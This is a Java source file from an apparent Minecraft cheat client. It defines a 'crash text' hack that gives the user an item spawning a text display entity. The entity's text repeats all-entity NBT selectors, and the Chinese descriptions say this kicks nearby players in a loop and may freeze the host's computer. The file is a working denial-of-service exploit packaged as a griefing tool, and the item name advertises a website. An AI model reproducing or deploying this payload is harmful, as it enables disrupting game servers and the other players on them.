package lexis.Hack.Hacks.Items;

import lexis.Hack.Hack;
import lexis.Hack.Hackutil.NotificationManager;
import lexis.Hack.Hackutil.config.HackConfig;
import lexis.item.Utils;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.network.chat.Component;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;

public class CrashTextHack extends Hack {
   private HackConfig config = HackConfig.getInstance();

   public CrashTextHack() {
      super("循环踢出文本", new String[]{"生成的循环踢出文本", "已加载的区块最近玩家会被循环踢出！自己会被踢出！", "杀死(kill)这踢出文本 就可以停止循环踢出", "§c§l警告：在最近有房主 放了，可能房主的电脑卡死了还能正常玩服务器！"}, Hack.Category.ITEMS, false);
   }

   public void onClick() {
      if (mc.f_91074_ != null && mc.f_91074_.m_150110_().f_35937_) {
         ItemStack stack = new ItemStack(Items.f_42552_, 1);
         CompoundTag entityTag = new CompoundTag();
         entityTag.m_128359_("id", "minecraft:text_display");
         StringBuilder textContent = new StringBuilder("[");

         for(int i = 0; i < 32; ++i) {
            textContent.append("{\"nbt\":\"\",\"entity\":\"@e\"}");
            if (i < 31) {
               textContent.append(",");
            }
         }

         textContent.append("]");
         entityTag.m_128359_("text", textContent.toString());
         CompoundTag tag = new CompoundTag();
         tag.m_128365_("EntityTag", entityTag);
         stack.m_41751_(tag);
         stack.m_41714_(Component.m_237113_("§dLexis Error LX!!!! ʷʷʷ.ʰᵘᵃʰᵘᵒˢʰᵉⁿ.ᶜᵒᵐ！"));
         boolean added = Utils.addItem(stack);
         if (!added) {
            NotificationManager.info("循环踢出文本", "已给予 循环踢出文本！", 3);
         }

      } else {
         NotificationManager.error("循环踢出文本：", "你需要是创造模式！");
      }
   }

   public void onEnable() {
   }

   public void onDisable() {
   }

   public void onUpdate() {
   }
}
